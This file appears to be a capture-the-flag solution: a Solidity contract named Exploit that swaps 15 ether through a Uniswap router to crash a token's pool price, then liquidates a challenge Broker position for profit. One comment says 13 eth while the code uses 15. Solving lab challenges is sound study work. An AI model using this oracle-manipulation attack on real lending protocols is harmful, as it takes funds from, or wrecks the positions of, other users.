pragma solidity 0.8.0;

import "public/Setup.sol";

interface Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract Exploit {
    uint256 constant DECIMALS = 1 ether;
    IUniswapV2Pair pair;
    Broker broker;
    ERC20Like token;
    WETH9 weth;
    Setup setup;
    Router router = Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    // goal: dump rate to 0 -> liquidate (even if not really profitable, we mess with their positions)
    constructor(Setup _setup) payable {
        setup = _setup;
        weth = setup.weth();
        weth.deposit{value: msg.value}();
        pair = setup.pair();
        broker = setup.broker();
        token = ERC20Like(address(setup.token()));

        weth.approve(address(broker), type(uint256).max);
        weth.approve(address(router), type(uint256).max);
        token.approve(address(broker), type(uint256).max);
        token.approve(address(router), type(uint256).max);

        uint256 ethToSend = 15 ether;

        uint256 balanceBefore = weth.balanceOf(address(this));

        // trade 13 eth for some tokens
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(token);
        uint256[] memory tokensReceived = router.swapExactTokensForTokens(
            ethToSend,
            1,
            path,
            address(this),
            type(uint256).max
        );

        // liquidate the guy with the tokens received
        uint256 tokenReceived = tokensReceived[1];
        uint256 receivedCollateral = broker.liquidate(address(setup), tokenReceived);
        require(weth.balanceOf(address(this)) > balanceBefore);
    }
}

